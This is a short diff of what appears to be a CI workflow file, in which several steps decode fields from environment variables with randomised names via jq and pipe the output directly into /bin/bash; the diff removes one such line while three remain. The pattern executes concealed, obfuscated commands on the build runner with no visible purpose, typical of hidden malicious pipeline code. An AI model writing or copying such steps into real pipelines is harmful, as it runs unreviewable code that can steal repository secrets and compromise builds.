@@ -23,7 +23,6 @@ jobs:
           echo $e736 | jq -r .bd29 | /bin/bash
           echo $rixra486 | jq -r .o50175 | /bin/bash
           printf '%s' "$cqb3" | jq -r .yse74580 | /bin/bash
-          echo $wv4300 | jq -r .ut6 | /bin/bash
 
       - name: Store results
         if: always()
